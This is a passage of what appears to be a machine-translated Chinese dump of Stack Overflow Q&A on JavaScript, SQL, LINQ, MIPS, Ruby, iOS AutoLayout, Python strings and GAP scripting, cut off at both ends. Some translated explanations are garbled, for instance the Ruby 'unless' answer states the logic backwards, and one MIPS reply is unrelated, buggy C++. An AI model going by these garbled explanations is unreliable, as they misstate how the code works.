                    Uri data = FileProvider.getUriForFile(mContext, BuildConfig.APPLICATION_ID + ".provider", new File(filepath.get(i)));
                    intent.setDataAndType(data, "*/*");
                    try {
                        String substring = filename.get(i).substring(filename.get(i).lastIndexOf("."));

                        if (substring.equals(".jpg")) {
                            intent.setDataAndType(data, "image/*");
                        } else if (substring.equals(".mp4")) {
                            intent.setDataAndType(data, "video/*");
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                    try {
                        mContext.startActivity(intent);
                    } catch (ActivityNotFoundException unused) {
                        Toast.makeText(mContext, "No application available", Toast.LENGTH_SHORT).show();
                    }
                }
            });

        }

        public int getItemCount() {
            return filepath.size();
        }
    } 
```

# javascript - 如何在 iOS 网络应用程序中获取实际屏幕高度

> ID：13418808
> 
> 赞同：1
> 
> 时间：2012-11-16T14:42:39.453
> 
> 标签：javascript, ios

我正在尝试确定 iOS 中的实际屏幕高度。

在一个简短的页面上。如果我使用下面的代码，我会得到不正确的尺寸。

```
window.innerHeight 
```

这将在我的 iPod touch 上返回 356。这是屏幕高度 - URL 栏。如果我将 CSS 规则添加到页面的容器中，那么它会返回正确的数字 416。

```
#container { min-height:600px; } 
```

但是，此解决方案的问题在于它在某些页面的底部添加了一大块空白区域。

我试图通过执行以下操作来解决此问题。

```
$('#container ').css('height', '800px');
window.scrollTo(0, 1);

$('#container ').css({
    'height' : window.innerHeight + 'px'
}); 
```

这行不通。它根本不影响页面高度，我不知道为什么。以前有没有人解决过这个问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-16T14:51:18.720

window.screen 对象应包含您要查找的内容

```
window.screen.height 
```

# asp.net-mvc-3 - 如何使用 MVC3 多站点共性简化 Visual Studio 中的开发过程？

> ID：13418811
> 
> 赞同：0
> 
> 时间：2012-11-16T14:42:46.993
> 
> 标签：asp.net-mvc-3, visual-studio-2010

我正在使用 Visual Studio 开发几个 MVC3 网站，它们之间的唯一区别是：

*   两张图片（在 ~/Content/Images 中）
*   根目录下的 web.config

我已经将我的模型分离到一个单独的项目中，但是视图和控制器的代码都是为站点重复的。

我怎样才能为此做一个 1..* ？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:49:30.940

你可以把控制器放到一个单独的项目中没问题。使用您的模型或在单独的项目中。

您更棘手的视图，我从未尝试过，但您可以将它们视为来自共享源的链接项目。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:56:04.257

如果唯一的区别是品牌（图像、样式等），您可以拥有一个带有一些设置的项目。

例如，如果每个网站的徽标不同，您可以通过项目属性或web.config 部分中`LogoUrl`的“设置”选项卡添加设置。`<appSettings>`

然后在您看来，引用该设置而不是硬编码路径：

```
<img src="@Settings.Default.LogoUrl" alt="Logo" /> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-03T20:34:13.850

由于所有站点都基于相同的构建，因此我将公共文件移至根目录并为每个站点创建了一个单独的文件夹。然后用一个简单的批处理文件就可以完成我所需要的：

```
for /f %%X in (websitelist.txt) do rd /Q /S ..\%%X
for /f %%X in (websitelist.txt) do echo D | xcopy /E ..\mybasewebsite.com ..\%%X
for /f %%X in (websitelist.txt) do copy %%X\*.* ..\%%X /Y 
```

# sql - 从变量中选择数据库

> ID：13418812
> 
> 赞同：0
> 
> 时间：2012-11-16T14:42:49.967
> 
> 标签：sql

所以我有两个数据库，它们之间没有关系。第一个是我的 dbo.Clients 存在的地方，并且有一列是第二个 db 的数据库名称。我的想法是从客户端中选择 dbName，然后使用该变量从第二个数据库中选择数据。查询不运行可以有人阐明一点吗？谢谢。

```
 @dbName varchar(50) OUTPUT,
@clientID varchar(50)
AS
BEGIN
    SET NOCOUNT ON;
    -- Insert statements for procedure here
    SELECT * FROM sql02.iproconfig4.dbo.Clients 
    SET @dbName = (SELECT Clients.ClientDatabase FROM sql02.iproconfig4.dbo.Clients WHERE ClientID = @clientID) 
    SELECT * FROM sql02.@dbName.dbo.Discovery   
END 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:45:24.833

您将需要使用[动态 SQL](http://www.mssqltips.com/sqlservertip/1160/execute-dynamic-sql-commands-in-sql-server/)来完成此操作：

```
DECLARE @sql nvarchar(max)
SET @sql = 'SELECT * FROM sql02.' + @dbName + '.dbo.Discovery'
EXEC sp_executesql @sql 
```

# c# - 按结果将 Linq 组映射到对象

> ID：13418815
> 
> 赞同：2
> 
> 时间：2012-11-16T14:42:52.780
> 
> 标签：c#, linq, ienumerable

我有一个作为摘要的类，它将作为 IEnumerable 传递给 MVC 视图。该类看起来像：

```
public class FixedLineSummary
{
    public long? CustomerId { get; set; }
    public string CustomerName { get; set; }
    public int? NumberOfLines { get; set; }
    public string SiteName { get; set; }
} 
```

从 db 返回的结果包含所有单个条目，因此我使用 linq 来总结这些：

```
var summary = (from r in result 
              let k = new {r.CustomerId, CustomerName = r.CompanyName, r.SiteName}
              group r by k into t
              select new 
              {
                  t.Key.CustomerId,
                  t.Key.CustomerName,
                  t.Key.SiteName,
                  Lines = t.Sum(r => r.lines)
              }); 
```

当我尝试将结果转换为我的对象时，我只是不断收到一个错误：

```
Instance argument: cannot convert from 'System.Linq.IQueryable<AnonymousType#1>' to 'System.Collections.Generic.IEnumerable<Domain.Entities.FixedLineSummary>' 
```

有没有办法将 linq 查询的结果转换为我的类的枚举？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-16T14:46:22.367

您应该更改投影以创建您的类，而不是匿名类型：

```
var summary = from r in result 
              let k = new {r.CustomerId, CustomerName = r.CompanyName, r.SiteName}
              group r by k into t
              select new FixedLineSummary
              {
                  CustomerId = t.Key.CustomerId,
                  CustomerName = t.Key.CustomerName,
                  SiteName = t.Key.SiteName,
                  NumberOfLines = t.Sum(r => r.lines)
              }; 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-16T14:47:56.483

您不能将匿名类型转换为，`FixedLineSummary`因为两者根本不相关（对于编译器）。相反，您需要手动创建类的实例：

```
IEnumerable<FixedLineSummary> summaries = summary
   .Select(s => new FixedLineSummary
   {
        CustomerId = s.CustomerId,
        CustomerName = s.CustomerName,
        NumberOfLines = s.NumberOfLines,
        SiteName = s.SiteName
   })
   .ToList(); 
```

# actionscript-3 - AS3：在 enterframe/s 中循环

> ID：13418819
> 
> 赞同：2
> 
> 时间：2012-11-16T14:42:59.797
> 
> 标签：actionscript-3, loops, enterframeevent

我有 6 个必须随机连续移动的对象。单独输入每个对象或使用循环寻址所有对象的 1 个输入框是否有效。

```
var myObjArray:Array = new Array(); // Contains 6 movieclip objects

for(var i=1; i<=6; i++)
{
    var Square:MoveObject = new MoveObject();
    Square.addEventListener(Event.ENTER_FRAME, Square.go);
    myObjArray[i] = Square;
}

public Class MoveObject extends Movieclip{
    public function go(e:Event):void
    {
        this.x++;
    }
} 
```

或者我们在一个 EnterFrame 函数中遍历对象？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-16T15:14:54.040

每个函数调用都有性能损失——这就是人们在代码的关键部分谈论“内联”函数的原因（内联函数内容而不是进行函数调用）。

那么，最好的情况是只添加 1 个侦听器，并在该侦听器中循环所有 6 个对象。另一个提示 - 如果你反向迭代循环，你只调用数组上的 .length() 函数一次，而如果你从 0-length 迭代，for 循环必须每次调用 length 函数来确定条件是否为遇见了。

```
function enterFrame(e:Event):void
{
  for (var i:int=myObjArray.length-1; i>=0; i--) {
    myObjArray[i].x++;
  }
} 
```

肯定还有其他优化（有人说--i 比i-- 快，但我不确定ActionScript 是否如此）。

当然，在 6 个对象上，这并不是什么大问题，但如果你扩大规模，你肯定会想要使用单个侦听器。

# crystal-reports - 如何在 Crystal Reports 中循环执行计划

> ID：13418825
> 
> 赞同：0
> 
> 时间：2012-11-16T14:43:23.513
> 
> 标签：crystal-reports, logic, reporting

我正在 Crystal Reports 2008 中构建一个报表。该报表正在处理员工的日程安排。有时间表打开的时间段，以及时间表不可用的时间段。

目前，我已经构建了我的逻辑，以便它找到不可用时间的开始和结束。他们的报告告诉我该特定员工有多少小时不可用。

我的问题是，有时，员工在他们的日程安排开始时有一个块标记为“不可用”，而在一天结束时有一个块标记为“不可用”，但在两者之间他们是“开放的”。因此，报告称该特定员工一整天都在外面，但他们实际上在工作。告诉这些特定员工如何安排他们的一天不是一种选择——他们决定自己的日程安排，而我编写报告以满足他们的需求。

```
SCHEDULE_TIME   EMP_ID  UNAVAILABLE_CODE    WORK_LENGTH
7/5/2011 11:00  100     NULL                    15
7/5/2011 11:15  100     NULL                    15
7/5/2011 11:30  100     NULL                    15
7/5/2011 11:45  100     NULL                    15
7/5/2011 12:00  100     15                      5
7/5/2011 17:00  100     15                      5 
```

此示例显示某人将如何为不可用时间计算 5 小时块，但它只有 2 个约会。对于代码，我在约会时间之间使用 DATEDIFF。

（本质上，他们构建了多个“不可用”块，我的逻辑每天只能容纳一个“不可用”块）。

我很确定我需要在报告中运行一种 DO...WHILE 循环，以计算不可用的总小时数。我只是不确定如何在 Crystal Reports 中构建循环。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T16:51:57.253

也许我错过了一些东西，但你想做的事情看起来很简单。两个明显的选择：

1.  运行总计：将字段设置为 {TABLE.WORK_LENGTH} 将类型设置为 sum 将评估公式设置为 not(isnull({TABLE.UNAVAILABLE_CODE})) 设置组/字段 {TABLE.EMP_ID} 更改时的重置（假设您'正在寻找每位员工的总数）

2.  公式/总和：使用`if not(isnull({TABLE.UNAVAILABLE_CODE})) then {TABLE.WORK_LENGTH} else 0` 在 {TABLE.EMP_ID} 上创建组创建公式字段不可用时间 在组页脚中的公式字段上创建总和

# mysql - 在mysql时间戳上选择日期范围

> ID：13418827
> 
> 赞同：7
> 
> 时间：2012-11-16T14:43:27.927
> 
> 标签：mysql, sql

我正在尝试以下但没有得到任何结果：

```
SELECT *
FROM users_test
WHERE dateadded >= UNIX_TIMESTAMP('2012-02-01 00:00:00') 
AND dateadded <  UNIX_TIMESTAMP('2012-11-01 00:00:00'); 
```

但是我知道有日期在该范围内的列，例如

```
2012-05-11 17:10:08 
```

有一个更好的方法吗？

最终我想搜索多个参数，尽管不是同时，比如今天、昨天、上周、上个月等，还有日期范围和月份范围

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-11-16T14:48:31.240

你有没有尝试过？

```
SELECT *
FROM users_test
WHERE dateadded >= '2012-02-01 00:00:00'
AND dateadded <  '2012-11-01 00:00:00' 
```

就我所见，您的表似乎以您想要查找的相同方式存储数据（`2012-05-11 17:10:08`），因此在这种情况下，您不需要 UNIX_TIMESTAMP。

此外，我可以看到您想从结果中排除第二个日期（因为您使用的是`<`而不是`<=`），否则使用`WHERE dateadded BETWEEN '2012-02-01 00:00:00' AND '2012-11-01 00:00:00'`也可以...

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-11-16T14:54:02.983

只需使用 SQL`BETWEEN`关键字。就这样。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-12-03T17:58:05.907

试试这个：

```
SELECT * FROM 
      users_test
 WHERE
     dateadded BETWEEN '2012-02-01 00:00:00' AND '2012-11-01 00:00:00' 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-05-29T22:55:11.527

```
SELECT * FROM table_name WHERE DATE(date_field) between '2015-05-10' and '2015-05-21` 
```

# assembly - MIPS：将 C 代码翻译成汇编

> ID：13418830
> 
> 赞同：0
> 
> 时间：2012-11-16T14:43:37.867
> 
> 标签：assembly, mips

我正在尝试将下面的 C 代码翻译成 MIPS 汇编语言，但我对其中的大部分内容有所了解，但我不知道汇编中第一行的等价物是什么......

```
int ary[3] = {2,3,4}; 
```

如果有人可以查看我的 C 来组装“翻译”并验证我是否走在正确的轨道上，我将不胜感激。

**C代码**

```
int ary[3] = {2,3,4};
int i=0;

//loop to double array values
for(i=0; i < 3; i++){
    ary[i] = ary[i]*2;
} 
```

**我尝试了什么：**

```
add $t0, $s0, $zero #get base address of the array 'ary' (dont understand this part)
addi $t1, baseAddress, 8 #cut off point to stop the loop; array[2]
addi $t1, $zero, $zero #initialize i=0

Start:
lw $t2, base(offset)
sll $t2, $t0, 1 #mutiply $t2 by 2  
sw $t2, base(offset)
addi $t0, $t0, 4 # Increment the address to the next element
bne $t0, $t1, Start # $t0 will keep increasing until reaches stopping point $t1
Exit: 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T18:21:27.457

如果这是一个本地数组，则在堆栈上为其分配空间，然后从代码中对其进行初始化。C 代码的一个可能的 asm 翻译可能如下所示：

```
 addi $sp, $sp, -12     # allocate space for 3 words, $sp is now the address of the array
    addi $t0, $zero, 2
    sw $t0, ($sp)          # ary[0]=2
    addi $t0, $zero, 3
    sw $t0, 4($sp)         # ary[1]=3
    addi $t0, $zero, 4
    sw $t0, 8($sp)         # ary[2]=4

    addi $t0, $zero, 0     # initialize i=0

Start:
    sll $t1, $t0, 2        # i*4 for element size
    add $t1, $t1, $sp      # add base address of array, $t1 is now &ary[i]
    lw $t2, ($t1)          # load ary[i]
    sll $t2, $t2, 1        # mutiply by 2
    sw $t2, ($t1)          # store back to ary[i]
    addi $t0, $t0, 1       # i++
    addi $t1, $t0, -3      # check if i<3 by doing (i-3)<0
    bltz $t1, Start
    addi $sp, $sp, 12      # free the array 
```

您的 asm 代码采用了稍微不同的方法，C 版本看起来像：

```
int* end = &ary[3];
for(int* ptr = ary; ptr != end; ptr++)
{
    *ptr = *ptr * 2;
} 
```

固定的 asm 版本是：

```
 addi $t1, $sp, 12      # end=&ary[3]
    addi $t0, $sp, 0       # ptr=ary

Start:
    lw $t2, ($t0)          # load ary[i]
    sll $t2, $t2, 1        # mutiply by 2
    sw $t2, ($t0)          # store back to ary[i]
    addi $t0, $t0, 4       # ptr++ (note it is incremented by 4 due to element size)
    bne $t0, $t1, Start    # ptr!=end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-18T05:58:35.643

你的代码有很多错误

```
addi $t1, baseAddress, 8 #cut off point to stop the loop; array[2]
addi $t1, $zero, $zero #initialize i=0 
```

在第一行，除非 baseAddress 是一个寄存器，否则没有这样的指令。第二行应该是 a `add`，而不是`addi`因为 $zero 不是立即数

```
Start:
lw $t2, base(offset)
sll $t2, $t0, 1 #mutiply $t2 by 2  
sw $t2, base(offset) 
```

上面几行也有问题。您刚刚将一个单词加载到 $t2，然后立即将另一个值存储到 $t2，因此之前的加载是没有意义的

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2014-04-18T20:17:28.260

```
 #include <iostream>
  using namespace std;

  //prototypes

  int maxIs (int *x, int n);
  int minIs ( int *x, int n);
  void avgIs (int *x, int n, int *theAvg, int *theRem);

  int main(void)
  {
  int n = 8;
  int x[] = {1,2,3,4,5,6,7,8};
  int theMax, theMin, theAvg, theRem;

  theMax = maxIs(x,n);
  theMin = minIs(x,n);
  avgIs(x,n,&theAvg, &theRem);

  cout << "max = " << theMax << "\n";
  cout << "min = " << theMin << "\n";
  cout << "avg = " << theAvg << " " << theRem << "/" << n << "\n";
  cout << "Bye!\n";
  }

  //functions

 int maxIs (int *x, int n )
 {
int i;
int theMax = 0;
for (i=0; i<n; i++)
{
    if (x[i]>theMax) theMax =x[i];
}
return (theMax);
}

int minIs (int *x, int n )
{
int i;
int theMin = 0x7FFF;
for (i=0; i<n; i++)
{
    if (x[i]>theMin) theMin =x[i];
}
return (theMin);
}

void avgIs (int *x, int n, int *theAvg, int *theRem )
{
int i;
int theSum = 0;
for (i=0; i<n; i++)
{
    theSum += x[i];
}
*theAvg = theSum /n;
*theRem = theSum %n;
} 
```

# ruby - “除非”在 Ruby 中是如何工作的？

> ID：13418831
> 
> 赞同：-1
> 
> 时间：2012-11-16T14:43:37.567
> 
> 标签：ruby

我想重构：

```
def play_as_dealer
  if value < 16
      hit!(deck)
      play_as_dealer
   end
end 
```

到这个版本

```
def play_as_dealer
  hit!(deck) unless value > 16
  play_as_dealer
end 
```

我的带有**除非**语句的版本不起作用。这是为什么？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-16T14:56:25.660

的语义`command unless condition`等价于`command if !condition`。当且仅当条件在逻辑上为假时，`if`该命令才会执行，与表达式相反，在表达式中，如果条件为真，则将执行命令。

*除非*这样，否则您的示例可以翻译：

```
def play_as_dealer
  unless value >= 16
    hit!(deck)
    play_as_dealer
  end
end 
```

在您的示例中，您使用的是表达式的内联版本，其中`unless`限制仅对该行中的前一个表达式产生影响。如果您需要限制两个或更多命令，请使用我上面示例中的表单。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-16T14:50:20.043

我会质疑你为什么要重构除非如果你的 if 工作...

但是，在这种情况下，您的**除非**语法不正确 - 它与 if-else-end 非常相似。

```
def play_as_dealer
  unless value >= 16
    hit!(deck)
    play_as_dealer
  end
end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-16T17:16:15.963

如果您想要块之后的条件，请使用：

```
def play_as_dealer
  begin
    hit!(deck) 
    play_as_dealer 
  end unless value >= 16
end 
```

# ios - iOS：带有 1 个标签和 3 个按钮的简单自动布局

> ID：13418834
> 
> 赞同：1
> 
> 时间：2012-11-16T14:43:41.250
> 
> 标签：ios, autolayout

我正在玩 AutoLayout 并且真的把我的头撞到墙上，因为它看起来应该是一个非常简单的解决方案。

1.  我有一个垂直的控件列：1 个标签和 3 个按钮。
2.  我希望标签的高度为 40 像素（点），并根据其超级视图的宽度（左侧、顶部和右侧的标准间距）自动调整其宽度。
3.  我希望 3 个按钮在该标签下方垂直排列。
4.  我希望它们的宽度像标签一样自动调整大小。
5.  我希望它们的间距是标准的（水色？）间距（8 点，对吗？）。
6.  我希望 3 个按钮的高度相同。

我可以得到我想要的工作，但我在运行时不断在控制台中收到错误，我想弄清楚为什么我得到它们以及如何避免得到它们。我在 AutoLayout 上观看了 WWDC 视频，这是我迄今为止尝试过的：

```
UILabel *label = [self Label];
MMGlossyButton *button1 = ...
MMGlossyButton *button2 = ...
MMGlossyButton *button3 = ...
[[self view] addConstraints:
    [NSLayoutConstraint constraintsWithVisualFormat:@"H:|-[label]-|"
    options:0
    metrics:nil
    views:NSDictionaryOfVariableBindings(label)]];
[[self view] addConstraints:
    [NSLayoutConstraint constraintsWithVisualFormat:@"H:|-[button1]-|"
    options:0
    metrics:nil
    views:NSDictionaryOfVariableBindings(new)]];
[[self view] addConstraints:
    [NSLayoutConstraint constraintsWithVisualFormat:@"H:|-[button2]-|"
    options:0
    metrics:nil
    views:NSDictionaryOfVariableBindings(existing)]];
[[self view] addConstraints:
    [NSLayoutConstraint constraintsWithVisualFormat:@"H:|-[button3]-|"
    options:0
    metrics:nil
    views:NSDictionaryOfVariableBindings(provider)]];
[[self view] addConstraints:
    [NSLayoutConstraint constraintsWithVisualFormat:@"V:|-[label(40)]-[button1(>=25)]-[button2(==button1)]-[button3(==button1)]-|"
    options:0
    metrics:nil
    views:NSDictionaryOfVariableBindings(label, button1, button2, button3)]]; 
```

因此，这适用于以动态大小的方式显示视图，但控制台中会弹出以下错误：

```
Unable to simultaneously satisfy constraints.
Probably at least one of the constraints in the following list is one you don't want. 
Try this: 
    (1) look at each constraint and try to figure out which you don't expect; 
    (2) find the code that added the unwanted constraint or constraints and fix it. 
        (Note: If you're seeing NSAutoresizingMaskLayoutConstraints that you 
               don't understand, refer to the documentation for the UIView 
               property translatesAutoresizingMaskIntoConstraints) 

// A whole bunch of constraint stuff that doesn't appear to be important...

Will attempt to recover by breaking constraint
<NSLayoutConstraint:0x7554c40 V:[MMGlossyButton:0x7554b40(99)]> 
```

所以，最后一点似乎表明我在视图上的第一个按钮静态大小为 99 磅高。
这是它在视图上的大小。
这是完全任意的。
我不想分配，但无法找到取消分配的方法。

尽管我得到了我想要的东西（某种程度上，最终），但这似乎是一种真正迂回的方式来完成非常简单的事情。我是否缺少有关 AutoLayout 的一些基本知识，或者它的功能是否需要如此复杂？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-16T19:03:15.050

您遇到错误是因为您将代码中生成的约束与界面生成器添加的约束混合和匹配。界面生成器不允许您生成模棱两可的布局，因此几乎按照定义，如果您添加额外的约束，您将得到一个`"Unable to simultaneously satisfy"`错误，这是许多婚姻的失败。

要解决这个问题，您要么需要在界面生成器中定义所有需要的约束，要么需要将特定的约束标记为出口并在代码中删除它们，然后再添加自己的。

在您的情况下，约束很简单，可以在 IB 中创建。

您可以在选择标签时使用 IB 中的此按钮固定到特定高度：

![在此处输入图像描述](../Images/44fba8a9131e209a13bf7947f9f37e0d.png)

中间的那个，看起来像一个大梁。这为您提供了以下有用的菜单：

![在此处输入图像描述](../Images/eb4da99a4431e6b3f8f04c1223245519.png)

选择其中一个允许您针对标签创建一个新的约束，然后您可以通过选择它来编辑它：

![在此处输入图像描述](../Images/f306343cfd167b5788faacb3d8b33f54.png)

然后，您可以添加按钮，选择所有三个按钮，并使用相同的菜单创建等高约束。

在 IB 中创建的约束并不是特别灵活，因此如果您确实决定需要在代码中创建或修改它们，最好创建特定约束的出口，然后删除并重新创建它们，或者修改`constant`运行时的值。

# java - URL的缓存内容

> ID：13418835
> 
> 赞同：3
> 
> 时间：2012-11-16T14:43:52.103
> 
> 标签：java, url, caching

我有一个非常简单的用例：当远程端的内容发生变化时（例如，当“上次修改”发生变化时），通过正确和自动重新加载来缓存 URL 的内容。

我怎样才能在 Java 中做到这一点？

注意：我在类路径上有 spring、guava 和 commons-lang3，但我找不到任何支持。Guava 支持缓存驱逐，但没有办法实现每次访问检查。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T17:32:28.047

您可以使用[HttpClient Cache](http://hc.apache.org/httpcomponents-client-ga/tutorial/html/caching.html)。

> HttpClient Cache 提供与 HttpClient 一起使用的符合 HTTP/1.1 的缓存层——Java 等效于浏览器缓存。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:47:55.747

您可以将文件的**校验和**保存在数据库中，并将其与远程端文件进行比较。

如果失败则重新加载文件。

# excel - 复制工作表 1

> ID：13418844
> 
> 赞同：0
> 
> 时间：2012-11-16T14:44:34.643
> 
> 标签：excel, excel-2007

在 Excel 2007 中：我想复制 SHEET2 中的值，使其与 Sheet1 相同，我正在这样做：

```
=(SHEET1!B1) 
```

这具有复制 0 而不是空单元格的副作用。（或日期 01-01-1900）

如何在忽略空单元格的同时复制 SHEET1 值？

我想看到的一个例子：

```
SHEET1
A1|B1|
  | 3|

SHEET2
A1|B1|
  | 3|

Not
A1|B1|
 0| 3| 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T15:05:28.280

我有两个解决方案给你。

**公式：**

`=IF(Sheet1!A1 = ""; ""; Sheet1!A1)`

* * *

**宏：**

```
Sub test()
    Sheets("Sheet1").Select
    Cells.Select
    Selection.Copy
    Sheets("Sheet2").Select
    Cells.Select
    Sheets("Sheet2").Paste
End sub 
```

# python - 大字符串和 len()

> ID：13418845
> 
> 赞同：0
> 
> 时间：2012-11-16T14:44:39.587
> 
> 标签：python, string, ascii

这可能是一个新手问题，但在这里。我有一个大的`string`（167572 字节），既有`ASCII`ASCII 字符也有非 ASCII 字符。当我`len()`在字符串上使用时，我弄错了`length`。似乎这`len()`不算 0x0A 字符。我可以获得字符串实际长度的唯一方法是使用以下代码：

```
for x in test:  
   totalLen += 1   
for x in test:  
   if x == '\x0a':  
      totalLen += 1  
print totalLen 
```

有什么问题`len()`？还是我用错了？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-16T14:48:38.523

您将编码的字节字符串与 unicode 文本混淆了。例如，在 UTF-8 中，最多使用 3 个字节来编码任何给定的字符，在 UTF-16 中，每个字符*至少*使用2 个字节进行编码。

python 字符串是一系列字节，要获得 unicode，您必须使用适当的编解码器对字符串进行解码。例如，如果您的文本使用 UTF-8 编码，您可以使用以下命令对其进行解码：

```
test = test.decode('utf8') 
```

另一方面，写入文件的数据*总是*经过编码，因此如果使用 UTF-16 编解码器写入，长度为 10 的 unicode 字符串可能会占用文件中的 20 个字节。

很可能您对这种“更宽”的字符感到困惑，而不是您的`\n`（ASCII 10）字符是否被正确计算。

请帮自己一个忙，阅读 Unicode 和编码：

*   [Joel on Software：每个软件开发人员绝对、绝对必须了解 Unicode 和字符集的绝对最低要求（没有借口！）](http://www.joelonsoftware.com/articles/Unicode.html)
*   [Python Unicode](http://docs.python.org/2/howto/unicode.html) HOWTO 。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-16T14:46:29.520

可能是您希望它包含`\r\n`，即 ASCII 13（回车）后跟 ASCII 10（换行），或者您在将字符串写入文本文件后查看字符串，它会添加这些？

很难具体说明，因为您没有提供很多细节，即字符串数据的来源。

# shell - 如何从 shell 脚本调用 GAP 函数？

> ID：13418849
> 
> 赞同：3
> 
> 时间：2012-11-16T14:45:05.663
> 
> 标签：shell, ipc, child-process, non-interactive, gap-system

我想得到[GAP](http://www.gap-system.org/)软件功能的结果。这是一个交互式命令行工具，主要面向从事群论相关主题的数学家。文档/常见问题解答关于[8.1 的说明：我可以从另一个程序调用 GAP 函数吗？](https://www.gap-system.org/Faq/faq.html#8.1)这通常是不可能的。但是，将 GAP 作为子进程运行并使用管道、伪 tty、UNIX FIFO 或其他类似设备与之通信是可以做到的。

使用名为 CrystCat（Crystallographic Groups Catalog）的包的示例会话如下所示：

```
$ gap
gap > LoadPackage( "CrystCat" );
gap > DisplaySpaceGroupType( "P1" );
#I     Space-group type (3,1,1,1,1); IT(1) = P1; orbit size 1; fp-free
gap > quit;
$ # exited 'gap' and back in my shell 
```

由于我不熟悉这些技术，有人可以向我展示一个具有以下功能的最小示例：

```
$ ./script.sh "P1"
#I     Space-group type (3,1,1,1,1); IT(1) = P1; orbit size 1; fp-free
$ 
```

**更新：**这个[问题](https://stackoverflow.com/questions/3448468/is-it-possible-to-make-a-bash-shell-script-interact-with-another-command-line-pr)的公认答案不起作用。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-27T10:58:27.977

通过 gap-support 回答（使用 gap 的 stdin 读入能力）

```
#!/bin/sh

if [ "$#" != "1" ]; then
   echo "Usage: test.sh <string>"
   exit 1
fi;

gap -r -b -q << EOI
LoadPackage( "CrystCat" );
DisplaySpaceGroupType( "$1" );
EOI 
```

它完全按照要求工作，即

```
$ ./script.sh P1
#I     Space-group type (3,1,1,1,1); IT(1) = P1; orbit size 1; fp-free 
```

# objective-c - iOS 应用程序在单击 UIAlertview 后立即崩溃

> ID：13418854
> 
> 赞同：2
> 
> 时间：2012-11-16T14:45:33.507
> 
> 标签：objective-c, ios

> **可能重复：**
> [iOS 应用程序在单击 UIAlertview 上的按钮后立即崩溃](https://stackoverflow.com/questions/13409981/the-ios-app-crashed-right-after-clicking-the-button-on-a-uialertview)

在用户单击 UIAlertview 上的按钮后，我尝试使用电话应用程序拨打号码。手机应用确实打开了，但在单击 UIAlertview 上的按钮后，原始应用立即崩溃。有人知道原因吗？我确实试图确保我发布了应该发布的所有内容。错误是 0x3beb85b0: ldr r3, [r4, #8] EXC_BAD_ACCESS (code=1, address=0x7269634f) 任何帮助将不胜感激。谢谢！下面是代码：

```
 -(IBAction)dialButtonPressed:(UIButton *)numberButton
            {
            if ([company isEqualToString:@"Not Found"]==true){
                    message = [[UIAlertView alloc] initWithTitle:@"Sorry"
                                                                      message:@"No replace number found. Would you like to dial anyway?"
                                                                     delegate:self
                                                            cancelButtonTitle:@"No"
                                                            otherButtonTitles:@"Yes", nil];
                    message.tag = 1;
                    if(phoneLinkString)
                    {
                        [phoneLinkString release];
                        phoneLinkString = nil;
                    }
                    [message show];
                    [message autorelease];
                    phoneLinkString = [[NSString stringWithFormat:@"tel:%@",replace]retain];

                }
        }
- (void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex
        {

            if(message.tag == 1 && buttonIndex == 1){

                NSURL *phoneLinkURL = [NSURL URLWithString:phoneLinkString];
                [[UIApplication sharedApplication] openURL:phoneLinkURL];
                message = nil;
            }
        }
- (void)dealloc {
            [phoneNumberString release];
            [phoneNumberLabel release];
            [super dealloc];
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:55:35.030

你可以尝试`didDismissWithButtonIndex` 代替`clickedButtonAtIndex`. 我猜让我知道。

```
- (void)alertView:(UIAlertView *)alertView didDismissWithButtonIndex:(NSInteger)buttonIndex; 
```

# java - 没有 RessourceBundle 的 Java i18n

> ID：13418858
> 
> 赞同：2
> 
> 时间：2012-11-16T14:45:41.787
> 
> 标签：java, internationalization

我正在尝试`i18n`从我的`BuildPath`. 如果您试图`PropertiesFile`获得. 有没有一种方法可以从外部加载文件但仍然可以轻松检测您的语言环境？`ResourceBundle.getBundle``java.util.MissingResourceException``i18n``BuildPath`

编辑：

[这是我在Paweł Dyda](https://stackoverflow.com/a/13421051/1548788)的帮助下创建的解决方案。也许有人会需要它。可能会有一些改进，但它有效；）

```
import java.io.File;
import java.io.FileNotFoundException;
import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.util.List;
import java.util.Locale;
import java.util.MissingResourceException;
import java.util.ResourceBundle.Control;

import org.apache.commons.configuration.ConfigurationException;
import org.apache.commons.configuration.PropertiesConfiguration;
import org.apache.commons.io.FilenameUtils;
import org.apache.log4j.Logger;

public class GlobalConfigurationProvider {

    Logger logger = Logger.getLogger(GlobalConfigurationProvider.class);

    private static GlobalConfigurationProvider instance;

    PropertiesConfiguration i18n;

    private GlobalConfigurationProvider() {
        String path = GlobalConfigurationProvider.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        String decodedPath = "";
